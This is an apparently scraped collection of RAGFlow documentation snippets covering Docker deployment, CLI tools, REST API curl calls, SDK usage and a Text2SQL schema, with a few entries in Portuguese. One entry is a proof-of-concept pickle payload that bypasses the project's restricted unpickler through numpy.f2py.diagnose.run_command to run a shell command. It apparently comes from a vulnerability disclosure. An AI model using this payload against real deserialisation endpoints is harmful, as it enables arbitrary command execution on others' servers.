docker compose -f docker/docker-compose-base.yml up -d

----------------------------------------

TITLE: Running Layout/TSR Recognition CLI
DESCRIPTION: Command line interface for running layout recognition or table structure recognition on documents, with configurable threshold and mode settings

LANGUAGE: bash
CODE:
python deepdoc/vision/t_recognizer.py -h
usage: t_recognizer.py [-h] --inputs INPUTS [--output_dir OUTPUT_DIR] [--threshold THRESHOLD] [--mode {layout,tsr}]

options:
  -h, --help            show this help message and exit
  --inputs INPUTS       Directory where to store images or PDFs, or a file path to a single image or PDF
  --output_dir OUTPUT_DIR
                        Directory where to store the output images. Default: './layouts_outputs'
  --threshold THRESHOLD
                        A threshold to filter out detections. Default: 0.5
  --mode {layout,tsr}   Task mode: layout recognition or table structure recognition

----------------------------------------

TITLE: Iniciando o Servidor RAGFlow com Docker Compose
DESCRIPTION: Comandos para iniciar o servidor RAGFlow usando Docker Compose, com opções para CPU ou GPU.

LANGUAGE: bash
CODE:
$ cd ragflow/docker
# Use CPU for embedding and DeepDoc tasks:
$ docker compose -f docker-compose.yml up -d

# To use GPU to accelerate embedding and DeepDoc tasks:
# docker compose -f docker-compose-gpu.yml up -d

----------------------------------------

TITLE: Building RAGFlow Docker Image Without Embedding Models
DESCRIPTION: Commands to build a lightweight (~2GB) RAGFlow Docker image that relies on external LLM and embedding services. Includes cloning the repository, downloading dependencies, and building both dependency and main images.

LANGUAGE: bash
CODE:
git clone https://github.com/infiniflow/ragflow.git
cd ragflow/
uv run download_deps.py
docker build -f Dockerfile.deps -t infiniflow/ragflow_deps .
docker build --build-arg LIGHTEN=1 -f Dockerfile -t infiniflow/ragflow:nightly-slim .

----------------------------------------

TITLE: Delete Datasets Request Example
DESCRIPTION: Example curl request to delete multiple datasets by ID

LANGUAGE: bash
CODE:
curl --request DELETE \
     --url http://{address}/api/v1/datasets \
     --header 'Content-Type: application/json' \
     --header 'Authorization: Bearer <YOUR_API_KEY>' \
     --data '{
     "ids": ["test_1", "test_2"]
     }'

----------------------------------------

TITLE: Running RAGFlow Graph Test Client in Bash
DESCRIPTION: Command-line usage for the RAGFlow Graph test client. It demonstrates how to run the client with options for specifying the DSL, tenant ID, and stream output.

LANGUAGE: bash
CODE:
PYTHONPATH=path/to/ragflow python graph/test/client.py -h
usage: client.py [-h] -s DSL -t TENANT_ID -m

options:
  -h, --help            show this help message and exit
  -s DSL, --dsl DSL     input dsl
  -t TENANT_ID, --tenant_id TENANT_ID
                        Tenant ID
  -m, --stream          Stream output

----------------------------------------

TITLE: Setting RAGFlow Nightly Image
DESCRIPTION: Environment configuration for using the nightly Docker image with embedding models.

LANGUAGE: bash
CODE:
RAGFLOW_IMAGE=infiniflow/ragflow:nightly

----------------------------------------

TITLE: Chat Session Interaction Example
DESCRIPTION: Example demonstrating interactive conversation with a chat assistant

LANGUAGE: python
CODE:
from ragflow_sdk import RAGFlow

rag_object = RAGFlow(api_key="<YOUR_API_KEY>", base_url="http://<YOUR_BASE_URL>:9380")
assistant = rag_object.list_chats(name="Miss R")
assistant = assistant[0]
session = assistant.create_session()    

print("\n==================== Miss R =====================\n")
print("Hello. What can I do for you?")

while True:
    question = input("\n==================== User =====================\n> ")
    print("\n==================== Miss R =====================\n")
    
    cont = ""
    for ans in session.ask(question, stream=True):
        print(ans.content[len(cont):], end='', flush=True)
        cont = ans.content

----------------------------------------

TITLE: Clonando o Repositório RAGFlow
DESCRIPTION: Comando para clonar o repositório do RAGFlow do GitHub.

LANGUAGE: bash
CODE:
$ git clone https://github.com/infiniflow/ragflow.git

----------------------------------------

TITLE: Installing Jina Package
DESCRIPTION: Command to install the Jina package using pip.

LANGUAGE: bash
CODE:
pip install jina

----------------------------------------

TITLE: Verificando e Configurando vm.max_map_count no Linux
DESCRIPTION: Comandos para verificar e configurar o valor de vm.max_map_count, um parâmetro do sistema necessário para o funcionamento adequado do RAGFlow.

LANGUAGE: bash
CODE:
$ sysctl vm.max_map_count

LANGUAGE: bash
CODE:
$ sudo sysctl -w vm.max_map_count=262144

----------------------------------------

TITLE: Pushing Changes to GitHub in Bash
DESCRIPTION: Command to push the committed changes from the local branch to the corresponding branch on GitHub. This prepares the changes for creating a pull request.

LANGUAGE: bash
CODE:
git push origin my-branch.

----------------------------------------

TITLE: Checking Out Specific RAGFlow Version
DESCRIPTION: Command to switch to a specific version tag of RAGFlow.

LANGUAGE: bash
CODE:
git checkout -f v0.17.2

----------------------------------------

TITLE: JSON Error Response Structure
DESCRIPTION: Standard JSON error response format containing a data field, numeric error code, and error message string. Shows a TypeError from attempting to pass an unsupported tenant_id parameter to download_document().

LANGUAGE: json
CODE:
{"data":null,"code":100,"message":"TypeError(\"download_document() got an unexpected keyword argument 'tenant_id'\")"}

----------------------------------------

TITLE: Installing and Launching RAGFlow Frontend for Development
DESCRIPTION: Commands to install frontend dependencies and launch the RAGFlow frontend service for development.

LANGUAGE: bash
CODE:
cd web
npm install
npm run dev

----------------------------------------

TITLE: Installing Python Dependencies with uv
DESCRIPTION: Commands to install uv and use it to install Python dependencies for RAGFlow. Two options are provided: slim and full installation.

LANGUAGE: bash
CODE:
pipx install uv

LANGUAGE: bash
CODE:
uv sync --python 3.10 # install RAGFlow dependent python modules

LANGUAGE: bash
CODE:
uv sync --python 3.10 --all-extras # install RAGFlow dependent python modules

----------------------------------------

TITLE: Setting Virtual Memory Limits in Linux
DESCRIPTION: Commands to check and set vm.max_map_count system parameter required for RAGFlow operation

LANGUAGE: bash
CODE:
$ sysctl vm.max_map_count
$ sudo sysctl -w vm.max_map_count=262144

----------------------------------------

TITLE: Construindo uma Imagem Docker RAGFlow sem Modelos de Incorporação
DESCRIPTION: Comandos para clonar o repositório e construir uma imagem Docker do RAGFlow sem modelos de incorporação.

LANGUAGE: bash
CODE:
git clone https://github.com/infiniflow/ragflow.git
cd ragflow/
docker build --build-arg LIGHTEN=1 -f Dockerfile -t infiniflow/ragflow:nightly-slim .

----------------------------------------

TITLE: Deploying Local Model with Jina
DESCRIPTION: Commands to navigate to the rag/svr directory and run the jina_server.py script to deploy a local model.

LANGUAGE: bash
CODE:
cd rag/svr
python jina_server.py  --model_name gpt2

----------------------------------------

TITLE: Embedding RagFlow Agent with HTML iframe
DESCRIPTION: An HTML iframe snippet for embedding a RagFlow agent into a webpage. The actual iframe code needs to be generated from the RagFlow interface for each specific agent.

LANGUAGE: html
CODE:
<iframe src="https://example.com/agent-embed-url" width="100%" height="600px"></iframe>

----------------------------------------

TITLE: Checking Ollama Accessibility
DESCRIPTION: Commands to check if Ollama is accessible from different environments (Docker, local, remote).

LANGUAGE: bash
CODE:
sudo docker exec -it ragflow-server bash
root@8136b8c3e914:/ragflow# curl  http://host.docker.internal:11434/

curl  http://localhost:11434/

curl  http://${IP_OF_OLLAMA_MACHINE}:11434/

----------------------------------------

TITLE: Configuring DB_Description Knowledge Base for Text2SQL Agent
DESCRIPTION: Markdown text describing the structure and purpose of each table in the database used by the Text2SQL agent.

LANGUAGE: markdown
CODE:
### Customers (Customer Information Table)
The Customers table records detailed information about different customers in the online store. Here is the meaning of each field within this table:
- CustomerID: A unique identifier for a customer, auto-incremented.
- UserName: The name used by the customer for logging into the online store or displayed on the site.
- Email: The email address of the customer, which can be used for account verification, password recovery, and order updates.
- PhoneNumber: The phone number of the customer, useful for contact purposes such as delivery notifications or customer service.

### Products (Product Information Table)
The Products table contains information about the products offered by the online store. Each field within this table represents:
- ProductID: A unique identifier for a product, auto-incremented.
- ProductName: The name of the product, such as laptop, smartphone, nounch, etc.
- Description: Detailed information about the product.
- Price: The selling price of the product, stored as a decimal value to accommodate currency formatting.
- StockQuantity: The quantity of the product available in stock.

### Orders (Order Information Table)
The Orders table tracks orders placed by customers. This table includes fields that denote:
- OrderID: A unique identifier for an order, auto-incremented.
- CustomerID: A foreign key that references the CustomerID in the Customers table, indicating which customer placed the order.
- OrderDate: The date when the order was placed.
- TotalPrice: The total price of all items in the order, calculated at the time of purchase.

### OrderDetails (Order Details Table)
The OrderDetails table provides detailed information about each item in an order. Fields within this table include:
- OrderDetailID: A unique identifier for each line item in an order, auto-incremented.
- OrderID: A foreign key that references the OrderID in the Orders table, linking the detail to a specific order.
- ProductID: A foreign key that references the ProductID in the Products table, specifying which product was ordered.
- UnitPrice: The price per unit of the product at the time of order.
- Quantity: The number of units of the product ordered.
- TotalPrice: The total price for this particular item in the order, calculated as UnitPrice * Quantity.

----------------------------------------

TITLE: Exploiting Vulnerability in Restricted Unpickler with numpy in Python
DESCRIPTION: This proof of concept demonstrates how the restricted_loads function can be exploited to execute arbitrary commands using numpy.f2py.diagnose.run_command, despite the intended security measures.

LANGUAGE: python
CODE:
import pickle
from ragflow_patch import restricted_loads
class Exploit:
     def __reduce__(self):
         import numpy.f2py.diagnose
         return numpy.f2py.diagnose.run_command, ('whoami', )

Payload=pickle.dumps(Exploit())
restricted_loads(Payload)

----------------------------------------

TITLE: Formatting Table of Chunk Templates in Markdown
DESCRIPTION: A markdown table showing different chunk templates, their descriptions and compatible file formats supported by RAGFlow for document processing.

LANGUAGE: markdown
CODE:
| **Template** | Description                                                           | File format                                                                                   |
|--------------|-----------------------------------------------------------------------|-----------------------------------------------------------------------------------------------|\n|General      | Files are consecutively chunked based on a preset chunk token number. | DOCX, XLSX, XLS (Excel97~2003), PPT, PDF, TXT, JPEG, JPG, PNG, TIF, GIF, CSV, JSON, EML, HTML |
|Q&A          |                                                                       | XLSX, XLS (Excel97~2003), CSV/TXT                                                             |
|Manual       |                                                                       | PDF                                                                                           |
|Table        |                                                                       | XLSX, XLS (Excel97~2003), CSV/TXT                                                             |
|Paper        |                                                                       | PDF                                                                                           |
|Book         |                                                                       | DOCX, PDF, TXT                                                                                |
|Laws         |                                                                       | DOCX, PDF, TXT                                                                                |
|Presentation |                                                                       | PDF, PPTX                                                                                     |
|Picture      |                                                                       | JPEG, JPG, PNG, TIF, GIF                                                                      |
|One          | The entire document is chunked as one.                                | DOCX, XLSX, XLS (Excel97~2003), PDF, TXT                                                      |

----------------------------------------

TITLE: Setting vm.max_map_count on Windows with Docker Desktop WSL 2 Backend
DESCRIPTION: Commands to set vm.max_map_count on Windows systems running Docker Desktop with WSL 2 backend.

LANGUAGE: bash
CODE:
$ wsl -d docker-desktop -u root
$ sysctl -w vm.max_map_count=262144

----------------------------------------

TITLE: Listing Datasets Example
DESCRIPTION: Example showing how to list and iterate through datasets

LANGUAGE: python
CODE:
for dataset in rag_object.list_datasets():
    print(dataset)

----------------------------------------

TITLE: Cloning RAGFlow Repository
DESCRIPTION: Git command to clone the RAGFlow repository from GitHub.

LANGUAGE: bash
CODE:
$ git clone https://github.com/infiniflow/ragflow.git

----------------------------------------

TITLE: Checking Ollama Port Listening Status
DESCRIPTION: Command to verify if Ollama is listening on all IP addresses on port 11434.

LANGUAGE: bash
CODE:
sudo ss -tunlp | grep 11434

----------------------------------------

TITLE: Running Layout Recognition Command
DESCRIPTION: Example command for running layout recognition with custom threshold and output settings

LANGUAGE: bash
CODE:
python deepdoc/vision/t_recognizer.py --inputs=path_to_images_or_pdfs --threshold=0.2 --mode=layout --output_dir=path_to_store_result

----------------------------------------

TITLE: HTML Template Format Example
DESCRIPTION: Demonstrates how to format content using template keys in HTML structure. Shows usage of template variables {subtitle} and {content} that get replaced with actual values from defined keys.

LANGUAGE: text
CODE:
<h2>{subtitle}</h2>
<div>{content}</div>

----------------------------------------

TITLE: Upload Documents Request Example
DESCRIPTION: Example curl request to upload multiple documents to a dataset

LANGUAGE: bash
CODE:
curl --request POST \
     --url http://{address}/api/v1/datasets/{dataset_id}/documents \
     --header 'Content-Type: multipart/form-data' \
     --header 'Authorization: Bearer <YOUR_API_KEY>' \
     --form 'file=@./test1.txt' \
     --form 'file=@./test2.pdf'

----------------------------------------

TITLE: Launching Xinference Model
DESCRIPTION: Command to launch a specific model (Mistral) using Xinference, with customizable quantization.

LANGUAGE: bash
CODE:
xinference launch -u mistral --model-name mistral-v0.1 --size-in-billions 7 --model-format pytorch --quantization ${quantization}

----------------------------------------

TITLE: Development Environment Setup
DESCRIPTION: Commands to set up a local development environment for RAGFlow

LANGUAGE: bash
CODE:
git clone https://github.com/infiniflow/ragflow.git
cd ragflow/
uv sync --python 3.10 --all-extras
docker compose -f docker/docker-compose-base.yml up -d
export HF_ENDPOINT=https://hf-mirror.com
source .venv/bin/activate
export PYTHONPATH=$(pwd)
bash docker/launch_backend_service.sh
cd web
npm install
npm run dev

----------------------------------------

TITLE: Setting HuggingFace Mirror (Optional)
DESCRIPTION: Command to set an environment variable for using a HuggingFace mirror site.

LANGUAGE: bash
CODE:
export HF_ENDPOINT=https://hf-mirror.com

----------------------------------------

TITLE: Checking and Setting vm.max_map_count in Linux
DESCRIPTION: Commands to check and set the vm.max_map_count value, which is required to be at least 262144 for RAGFlow to function properly.

LANGUAGE: bash
CODE:
$ sysctl vm.max_map_count
$ sudo sysctl -w vm.max_map_count=262144

----------------------------------------

TITLE: Checking and Setting vm.max_map_count in Linux
DESCRIPTION: Commands to check and set the vm.max_map_count value, which is required to be at least 262144 for RAGFlow to function properly.

LANGUAGE: bash
CODE:
$ sysctl vm.max_map_count
$ sudo sysctl -w vm.max_map_count=262144

----------------------------------------

TITLE: Updating and Restarting RAGFlow Docker Container
DESCRIPTION: Commands to pull the latest Docker image and restart the RAGFlow container.

LANGUAGE: bash
CODE:
docker compose -f docker/docker-compose.yml pull
docker compose -f docker/docker-compose.yml up -d

----------------------------------------

TITLE: Deploying Ollama Docker Container
DESCRIPTION: Command to run Ollama in a Docker container, exposing port 11434 for communication.

LANGUAGE: bash
CODE:
sudo docker run --name ollama -p 11434:11434 ollama/ollama

----------------------------------------

TITLE: Service Configuration Template
DESCRIPTION: YAML configuration template for RAGFlow services including API server settings, database connections, and authentication options.

LANGUAGE: yaml
CODE:
ragflow:
  host: 0.0.0.0
  port: 9380

mysql:
  name: rag_flow
  port: 3306
  max_connections: 100

minio:
  host: minio:9000

----------------------------------------

TITLE: Building RAGFlow Docker Images
DESCRIPTION: Commands to build RAGFlow Docker images with and without embedding models

LANGUAGE: bash
CODE:
git clone https://github.com/infiniflow/ragflow.git
cd ragflow/
docker build --build-arg LIGHTEN=1 -f Dockerfile -t infiniflow/ragflow:nightly-slim .

# Full image with embedding models
docker build -f Dockerfile -t infiniflow/ragflow:nightly .

----------------------------------------

TITLE: Starting Xinference Local Instance
DESCRIPTION: Command to start a local Xinference instance, binding to all interfaces on port 9997.

LANGUAGE: bash
CODE:
xinference-local --host 0.0.0.0 --port 9997

----------------------------------------

TITLE: Verificando o Status do Servidor RAGFlow
DESCRIPTION: Comando para verificar os logs do servidor RAGFlow após a inicialização.

LANGUAGE: bash
CODE:
$ docker logs -f ragflow-server

----------------------------------------

TITLE: Construindo uma Imagem Docker RAGFlow com Modelos de Incorporação
DESCRIPTION: Comandos para clonar o repositório e construir uma imagem Docker do RAGFlow incluindo modelos de incorporação.

LANGUAGE: bash
CODE:
git clone https://github.com/infiniflow/ragflow.git
cd ragflow/
docker build -f Dockerfile -t infiniflow/ragflow:nightly .

----------------------------------------

TITLE: Configuring DDL Knowledge Base for Text2SQL Agent
DESCRIPTION: SQL statements defining the structure of the database tables used by the Text2SQL agent.

LANGUAGE: sql
CODE:
CREATE TABLE Customers (
  CustomerID int NOT NULL AUTO_INCREMENT,
  UserName varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  Email varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PhoneNumber varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  PRIMARY KEY (CustomerID)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE Products (
  ProductID int NOT NULL AUTO_INCREMENT,
  ProductName varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  Description text COLLATE utf8mb4_unicode_ci,
  Price decimal(10,2) DEFAULT NULL,
  StockQuantity int DEFAULT NULL,
  PRIMARY KEY (ProductID)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE Orders (
  OrderID int NOT NULL AUTO_INCREMENT,
  CustomerID int DEFAULT NULL,
  OrderDate date DEFAULT NULL,
  TotalPrice decimal(10,2) DEFAULT NULL,
  PRIMARY KEY (OrderID),
  KEY CustomerID (CustomerID)
) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE OrderDetails (
  OrderDetailID int NOT NULL AUTO_INCREMENT,
  OrderID int DEFAULT NULL,
  ProductID int DEFAULT NULL,
  UnitPrice decimal(10,2) DEFAULT NULL,
  Quantity int DEFAULT NULL,
  TotalPrice decimal(10,2) DEFAULT NULL,
  PRIMARY KEY (OrderDetailID),
  KEY OrderID (OrderID),
  KEY ProductID (ProductID)
) ENGINE=InnoDB AUTO_INCREMENT=40 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

----------------------------------------

TITLE: Cloning RAGFlow Repository
DESCRIPTION: Commands to clone the RAGFlow repository from GitHub and navigate to the project directory.

LANGUAGE: bash
CODE:
git clone https://github.com/infiniflow/ragflow.git
cd ragflow/

----------------------------------------

TITLE: Launching RAGFlow Service on MacOS
DESCRIPTION: Command to launch the RAGFlow service using Docker Compose on MacOS, which includes all required components like Elasticsearch, MySQL, MinIO, and Redis.

LANGUAGE: bash
CODE:
cd docker
docker compose -f docker-compose-macos.yml up -d

----------------------------------------

TITLE: Cloning RAGFlow Repository
DESCRIPTION: Command to clone the RAGFlow repository from GitHub.

LANGUAGE: bash
CODE:
git clone https://github.com/infiniflow/ragflow.git

----------------------------------------

TITLE: Docker Environment Configuration
DESCRIPTION: Configuration snippet showing how to set Hugging Face endpoint in Docker environment file

LANGUAGE: bash
CODE:
# HF_ENDPOINT=https://hf-mirror.com

----------------------------------------

TITLE: Create Dataset Request Example
DESCRIPTION: Example curl request to create a new dataset with configuration parameters

LANGUAGE: bash
CODE:
curl --request POST \
     --url http://{address}/api/v1/datasets \
     --header 'Content-Type: application/json' \
     --header 'Authorization: Bearer <YOUR_API_KEY>' \
     --data '{
      "name": "test_1"
      }'

----------------------------------------

TITLE: Running OCR Analysis CLI
DESCRIPTION: Command line interface for running OCR analysis on images or PDFs, with options to specify input sources and output directory

LANGUAGE: bash
CODE:
python deepdoc/vision/t_ocr.py -h
usage: t_ocr.py [-h] --inputs INPUTS [--output_dir OUTPUT_DIR]

options:
  -h, --help            show this help message and exit
  --inputs INPUTS       Directory where to store images or PDFs, or a file path to a single image or PDF
  --output_dir OUTPUT_DIR
                        Directory where to store the output images. Default: './ocr_outputs'

----------------------------------------

TITLE: Specifying Python Package Dependency
DESCRIPTION: Lists the 'requests' library as a required package for the project. This library is commonly used for making HTTP requests in Python applications.

LANGUAGE: Text
CODE:
requests

----------------------------------------

TITLE: Configuring RAGFlow Chat Plugin in JSON
DESCRIPTION: Example configuration for the ragflow_chat plugin's config.json file. It specifies the RAGFlow API key and host address, which are crucial for connecting the plugin to the RAGFlow server.

LANGUAGE: json
CODE:
{
  "ragflow_api_key": "YOUR_API_KEY",
  "ragflow_host": "127.0.0.1:80"
}

----------------------------------------

TITLE: Create Chat Completion Request Example
DESCRIPTION: Example curl request to create a chat completion with OpenAI-compatible API

LANGUAGE: bash
CODE:
curl --request POST \
     --url http://{address}/api/v1/chats_openai/{chat_id}/chat/completions \
     --header 'Content-Type: application/json' \
     --header 'Authorization: Bearer <YOUR_API_KEY>' \
     --data '{
        "model": "model",
        "messages": [{"role": "user", "content": "Say this is a test!"}],
        "stream": true
      }'